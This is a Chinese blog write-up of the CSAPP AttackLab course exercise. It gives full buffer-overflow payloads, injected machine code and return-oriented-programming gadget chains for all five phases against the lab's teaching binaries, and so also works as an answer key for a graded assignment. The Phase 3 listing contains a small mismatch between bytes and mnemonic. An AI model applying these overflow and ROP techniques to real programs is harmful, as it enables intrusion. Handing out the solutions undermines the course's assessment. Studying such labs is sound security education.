---
title: 深入理解计算机系统 AttackLab
top: false
cover: false
img: 'http://q9apk9x38.bkt.clouddn.com/medias/featureimages/csapp_b.jpg'
toc: true
mathjax: true
date: 2020-05-09 16:24:53
password:
summary: CSAPP AttackLab实验报告
tags:
    - CSAPP
    - LAB
categories:
    - 计算机基础
---

# CSAPP BombLab实验报告

## 前言

- 这个实验环境准备就搞了好久/(ㄒoㄒ)/~~  
- 一开始发现原来的WSL跑不了ctarget，报  
    > Couldn't map stack to segment at 0x55586000
- 搬到虚拟机下的CentOS，GDB跑不起来，报缺少glibc，尝试多次没法解决
- 最后换到服务器上的Ubuntu终于没问题了
- AttackLab是BufferLab的64位版本，包括了BufferLab的代码注入攻击(CI)增加了新的面向返回编程攻击(ROP)
- BufferLab需要IA32的知识，以后看了 [WebAside ASM:IA32](http://csapp.cs.cmu.edu/3e/waside/waside-ia32.pdf) 再做
- 实验之前先通过objdump把ctarget、rtarget的反汇编以及符号表导出来

## Phase 1

- 通过缓冲区溢出把返回地址就改为touch1的入口地址就可以了
- 通过反汇编可知getbuf分配的 BUFFER_SIZE 是0x28也就是40个字节

```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
c0 17 40 00 00 00 00 00 /* 0x5561dca0: 更改返回地址touch1的入口地址 */
```

## Phase 2

- 通过缓冲区溢出把返回地址就改为栈上的地址
- 把需要注入的代码通过gcc -c 编译成.o文件
- 再通过objdump -d 反汇编即可得到对应的机器表示
- 博主出现过一个很令人崩溃的Bug，立即数的$忘记写了，变成了绝对寻址

```x86asm
0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	48 83 c4 10          	add    $0x10,%rsp
   9:	c3                   	retq 
```

```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
a8 dc 61 55 00 00 00 00 /* 0x5561dca0: 更改返回地址0x5561dca8 */
bf fa 97 b9 59 48 83 c4 /* 0x5561dca8: 注入汇编指令的机器表示 */
10 c3 00 00 00 00 00 00 /* 0x5561dcb0: 注入汇编指令的机器表示 */
ec 17 40 00 00 00 00 00 /* 0x5561dcb8: touch2的入口地址 */
```

## Phase 3

- 通过缓冲区溢出把返回地址就改为栈上的地址
- 把需要注入的代码通过gcc -c 编译成.o文件
- 再通过objdump -d 反汇编即可得到对应的机器表示
- cookie是作为字符串传入的，注意存放的位置，writeup有相应提示
> When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.
- 博主出现过一个更令人崩溃的Bug，注释内容和注释符号之间漏了一个空格  
    导致hex2raw的parser识别出错，这里在vim下可以用%!xxd看看生成的数据对不对

```x86asm
0000000000000000 <.text>:
   0:	bf c0 dc 61 55       	mov    $0x5561dcc0,%edi
   5:	48 83 c4 10          	add    $0x20,%rsp
   9:	c3                   	retq   
```

```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
a8 dc 61 55 00 00 00 00 /* 0x5561dca0: 更改返回地址0x5561dca8 */
bf c0 dc 61 55 48 83 c4 /* 0x5561dca8: 注入汇编指令的机器表示 */
10 c3 00 00 00 00 00 00 /* 0x5561dcb0: 注入汇编指令的机器表示 */
fa 18 40 00 00 00 00 00 /* 0x5561dcb8: touch3的入口地址 */
35 39 62 39 39 37 66 61 /* 0x5561dcc0: sval字符串:cookie 0x59b997fa的字符串表示 */
00 00 00 00 00 00 00 00 /* 0x5561dcc8: sval字符串的结尾00，以及对齐的0 */
```

## Phase 4

- Phase4之后便是ROP攻击，因为栈地址随机化以及栈地址上的数据被设置为不可执行，便产生了这样一种攻击的手法
>  executing existing code, rather than injecting new code.
- 这里就是要找所谓的gadget，将返回地址设置为选定的gadget，代码便会从那开始执行

```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
ab 19 40 00 00 00 00 00 /* addval_219+4:0x4019ab 58 90 c3 */
                        /* popq %rax    nop     ret       */ 
fa 97 b9 59 00 00 00 00 /* data:cookie */
c6 19 40 00 00 00 00 00 /* setval_426+3:0x4019c6 89 c7 90 c3 */
                        /* mov %eax,%edi    nop         ret  */
ec 17 40 00 00 00 00 00 /* touch2的入口地址 */
```

## Phase 5

- Phase5实际上是最难的，虽然他只有5分
> You have also gotten 95/100 points for the lab.
That’s a good score. If you have other pressing obligations consider stopping right now.
- 问题的核心在于，栈地址是变动的，只能在运行时读取到真正的栈地址
- 而又没有可利用的add 或者 leaq 之类的指令
- 解决问题的要点在于farm.c中的函数add_xy
- 至于设置add_xy的参数需要的gadget，博主只发现一条执行的路径

```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
06 1a 40 00 00 00 00 00 /* 更改返回地址 mov %rsp,%rax */
c5 19 40 00 00 00 00 00 /* 0x00: mov %rax,%rdi */
ab 19 40 00 00 00 00 00 /* 0x08: pop %rax */
48 00 00 00 00 00 00 00 /* 0x10: data:offset */
dd 19 40 00 00 00 00 00 /* 0x18: mov %eax,%edx */
34 1a 40 00 00 00 00 00 /* 0x20: mov %edx,%ecx */
13 1a 40 00 00 00 00 00 /* 0x28: mov %ecx,%esi */
d6 19 40 00 00 00 00 00 /* 0x30: add_xy的入口地址 */
c5 19 40 00 00 00 00 00 /* 0x38: mov %rax,%rdi */
fa 18 40 00 00 00 00 00 /* 0x40: touch3的入口地址 */
35 39 62 39 39 37 66 61 /* 0x48: sval字符串:cookie 0x59b997fa的字符串表示 */
00 00 00 00 00 00 00 00 /* 0x50: sval字符串的结尾00，以及对齐的0 */
```

## 尾声

- 记录了下流水账，以后再说吧